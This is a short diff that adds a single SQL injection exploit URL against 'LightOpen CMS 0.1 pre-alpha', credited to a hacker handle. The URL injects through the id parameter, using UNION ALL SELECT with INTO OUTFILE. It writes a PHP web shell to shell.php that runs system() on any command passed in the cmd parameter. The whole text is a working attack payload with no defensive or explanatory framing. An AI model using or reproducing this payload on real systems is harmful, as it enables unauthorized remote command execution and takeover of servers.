@@ -1,0 +1,6 @@
+http://www.example.com/index.php?id=1%27+UNION+ALL+SELECT+'&lt;HTML&gt;&lt;title&gt;LightOpen CMS 0.1
+pre-alpha--SHELL BY --Y3NH4CK3R--&gt;&lt;/title&gt;&lt;body text=ffffff bgcolor=000000&gt;&lt;center&gt;','&lt;h1&gt;YOUR SHELL
+IS ON!&lt;br&gt;&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;','&lt;font color=ff0000&gt;&lt;h2&gt;Get var (cmd) to execute comands. Enjoy
+it!&lt;/h2&gt;&lt;/font&gt;&lt;h3&gt;Command Result:&lt;/h3&gt;&lt;?php system($_GET[cmd]); ?&gt;','&lt;br&gt;&lt;br&gt;&lt;font
+color=ff0000&gt;&lt;h3&gt;By y3nh4ck3r. Contact:
+y3nh4ck3r@gmail.com&lt;/h3&gt;&lt;/font&gt;&lt;/body&gt;&lt;/HTML&gt;'+INTO+OUTFILE+'[COMPLETE-PATH]/shell.php'%23
